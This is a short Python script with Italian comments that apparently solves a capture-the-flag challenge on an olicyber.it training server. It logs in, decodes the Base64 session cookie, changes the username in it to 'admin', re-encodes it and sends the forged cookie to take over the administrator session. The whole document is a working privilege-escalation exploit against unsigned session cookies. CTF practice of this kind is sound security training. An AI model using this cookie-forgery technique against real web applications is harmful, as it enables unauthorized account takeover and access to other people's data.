import requests
import base64
import urllib.parse

url = 'http://cma.challs.olicyber.it/index.php'
s = requests.Session()

# eseguire login payload_login = {'username':'scegliuninputbello', 'password':'scegliunaltroinputbello', 'submit':'login'}
# payload_reg = {'username':'scegliuninputbello', 'password':'scegliunaltroinputbello', 'submit':'register'}

payload_login = {'username':'scegliuninputbello', 'password':'scegliunaltroinputbello', 'login':'Log In'}
r = s.post(url, data=payload_login)

# cookie di sessione
cookie = s.cookies.get_dict()
print("Cookie post-login:\n", cookie)

cBase64 = cookie.get('session')

# prima decodifica URL encoding
cBase64 = urllib.parse.unquote(cBase64)
# poi decodifica Base64
decoded_bytes = base64.b64decode(cBase64)

str = decoded_bytes.decode('utf-8')
print("Cookie decodificato:\n", str)

#ora basterà modificare 'scegliuninputbello' con 'admin'
parts = str.rsplit('-', 1)  
parts[-1] = 'admin'      

admin_cookie = '-'.join(parts)

print("Nuovo cookie:", admin_cookie)

encodeAdmin = base64.b64encode(admin_cookie.encode('utf-8'))
encodeStr = encodeAdmin.decode('utf-8')

encoded_cookie = urllib.parse.quote(encodeStr, safe='') #con safe includo anhce '/' nell'encode

#richiesta craftata
exploit = {'session':  encoded_cookie}
r = requests.post(url, data=payload_login, cookies=exploit)
print(r.text)

